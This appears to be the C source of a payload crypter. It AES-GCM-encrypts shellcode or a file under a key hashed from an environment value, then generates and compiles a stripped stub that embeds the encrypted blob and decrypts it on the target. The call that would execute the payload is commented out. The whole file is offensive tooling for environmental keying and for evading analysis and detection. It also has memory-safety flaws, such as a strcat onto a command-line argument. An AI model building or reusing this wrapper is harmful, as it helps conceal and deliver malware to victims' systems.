#include <stdbool.h>
#include <unistd.h>
#include <stdio.h>
#include <openssl/sha.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <string.h>

#define AES_KEYLEN 32
#define GCM_IV_LEN 12
#define GCM_TAG_LEN 16

#define print(msg, ...) printf("[*] " msg "\n", ##__VA_ARGS__)

unsigned char *decrypt(unsigned char *key,
                       unsigned char *input,
                       int input_len,
                       int *plaintext_len_out)
{
    if (input_len < GCM_IV_LEN + GCM_TAG_LEN)
        return NULL;

    EVP_CIPHER_CTX *ctx;
    int len;
    int plaintext_len;

    unsigned char iv[GCM_IV_LEN];
    unsigned char tag[GCM_TAG_LEN];

    memcpy(iv, input, GCM_IV_LEN);

    int ciphertext_len = input_len - GCM_IV_LEN - GCM_TAG_LEN;

    unsigned char *ciphertext = input + GCM_IV_LEN;
    unsigned char *tag_ptr = input + GCM_IV_LEN + ciphertext_len;

    memcpy(tag, tag_ptr, GCM_TAG_LEN);

    unsigned char *plaintext = malloc(ciphertext_len);
    if (!plaintext)
        return NULL;

    ctx = EVP_CIPHER_CTX_new();
    if (!ctx) {
        free(plaintext);
        return NULL;
    }

    if (EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        free(plaintext);
        return NULL;
    }

    if (EVP_CIPHER_CTX_ctrl(ctx,
                            EVP_CTRL_GCM_SET_IVLEN,
                            GCM_IV_LEN,
                            NULL) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        free(plaintext);
        return NULL;
    }

    if (EVP_DecryptInit_ex(ctx, NULL, NULL, key, iv) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        free(plaintext);
        return NULL;
    }

    if (EVP_DecryptUpdate(ctx,
                          plaintext,
                          &len,
                          ciphertext,
                          ciphertext_len) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        free(plaintext);
        return NULL;
    }

    plaintext_len = len;

    // Set expected tag BEFORE final
    if (EVP_CIPHER_CTX_ctrl(ctx,
                            EVP_CTRL_GCM_SET_TAG,
                            GCM_TAG_LEN,
                            tag) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        free(plaintext);
        return NULL;
    }

    // Verify authentication
    if (EVP_DecryptFinal_ex(ctx,
                            plaintext + len,
                            &len) != 1) {
        // Authentication failed
        EVP_CIPHER_CTX_free(ctx);
        free(plaintext);
        return NULL;
    }

    plaintext_len += len;

    *plaintext_len_out = plaintext_len;

    EVP_CIPHER_CTX_free(ctx);
    return plaintext;
}


unsigned char *aes_gcm_encrypt(
    unsigned char *key,
    unsigned char *plaintext,
    int plaintext_len,
    int *out_len)
{
    EVP_CIPHER_CTX *ctx;
    int len;
    int ciphertext_len;

    unsigned char iv[GCM_IV_LEN];
    unsigned char tag[GCM_TAG_LEN];

    unsigned char *out =
        malloc(GCM_IV_LEN + plaintext_len + GCM_TAG_LEN);
    if (!out) return NULL;

    if (!RAND_bytes(iv, GCM_IV_LEN)) {
        free(out);
        return NULL;
    }

    ctx = EVP_CIPHER_CTX_new();
    if (!ctx) { free(out); return NULL; }

    EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL);
    EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, GCM_IV_LEN, NULL);
    EVP_EncryptInit_ex(ctx, NULL, NULL, key, iv);

    memcpy(out, iv, GCM_IV_LEN);

    EVP_EncryptUpdate(ctx,
        out + GCM_IV_LEN,
        &len,
        plaintext,
        plaintext_len);

    ciphertext_len = len;

    EVP_EncryptFinal_ex(ctx,
        out + GCM_IV_LEN + len,
        &len);

    ciphertext_len += len;

    EVP_CIPHER_CTX_ctrl(ctx,
        EVP_CTRL_GCM_GET_TAG,
        GCM_TAG_LEN,
        tag);

    memcpy(out + GCM_IV_LEN + ciphertext_len,
           tag,
           GCM_TAG_LEN);

    *out_len = GCM_IV_LEN + ciphertext_len + GCM_TAG_LEN;

    EVP_CIPHER_CTX_free(ctx);
    return out;
}

unsigned char *read_file(const char *path, int *size_out)
{
    FILE *f = fopen(path, "rb");
    if (!f) return NULL;

    fseek(f, 0, SEEK_END);
    long size = ftell(f);
    rewind(f);

    unsigned char *buf = malloc(size);
    if (!buf) { fclose(f); return NULL; }

    fread(buf, 1, size, f);
    fclose(f);

    *size_out = size;
    return buf;
}

unsigned char *encrypt_payload(
    unsigned char *key,
    char *infile,
    bool is_shellcode,
    int *out_len)
{
    unsigned char *plaintext;
    int plaintext_len;

    if (is_shellcode) {
        plaintext = (unsigned char*)infile;
        plaintext_len = strlen(infile);
    } else {
        plaintext = read_file(infile, &plaintext_len);
        if (!plaintext) return NULL;
    }

    unsigned char *blob =
        aes_gcm_encrypt(key,
                        plaintext,
                        plaintext_len,
                        out_len);

    if (!is_shellcode)
        free(plaintext);

    return blob;
}

void generate_stub(
    unsigned char *blob,
    int blob_len,
    char *env_keytype)
{
    FILE *f = fopen("wrapped.c", "w");
    if (!f) return;

    FILE *base = fopen("wrapped_template", "r");
    char line[4096];
    while (fgets(line, sizeof(line), base))
        fputs(line, f);
    fclose(base);

    fprintf(f, "\n");

    strcat(env_keytype, "_template");
    FILE *t = fopen(env_keytype, "r");
    while (fgets(line, sizeof(line), t))
        fputs(line, f);
    fclose(t);

    fprintf(f, "\nint main(){\n");

    fprintf(f, "    unsigned char payload[] = {");
    for (int i = 0; i < blob_len; i++)
        fprintf(f, "0x%02x,", blob[i]);
    fprintf(f, "};\n");

    fprintf(f, "    unsigned int payload_len = %d;\n", blob_len);

    fprintf(f, "    unsigned char key[32];\n");
    fprintf(f, "    if (!getKey(key)) return 1;\n");

    fprintf(f, "    int pt_len = 0;\n");
    fprintf(f, "    unsigned char *pt = decrypt(key, payload, payload_len, &pt_len);\n");
    fprintf(f, "    if (!pt) return 1;\n");

    fprintf(f, "    printf(\"[*] Decrypted: %%s\\n\", pt);");

    fprintf(f, "    //executeComposite(pt, pt_len);\n");

    fprintf(f, "    return 0;\n");
    fprintf(f, "}\n");

    fclose(f);
}

int main(int argc, char *argv[])
{
    if (argc < 4)
        return 1;

    char *env_keytype = argv[1];
    char *env_value = argv[2];
    char *infile = argv[3];



    unsigned char key[SHA256_DIGEST_LENGTH];

    SHA256((unsigned char*)env_value,
           strlen(env_value),
           key);

    int blob_len;

    unsigned char *blob =
        encrypt_payload(key,
                        infile,
                        false,
                        &blob_len);

    if (!blob) {
        printf("Encryption failed\n");
        return 1;
    }
    generate_stub(blob, blob_len, env_keytype);
    free(blob);


    system("gcc -s -o out wrapped.c -lcrypto");
    //system("rm wrapped.c");

    return 0;
}
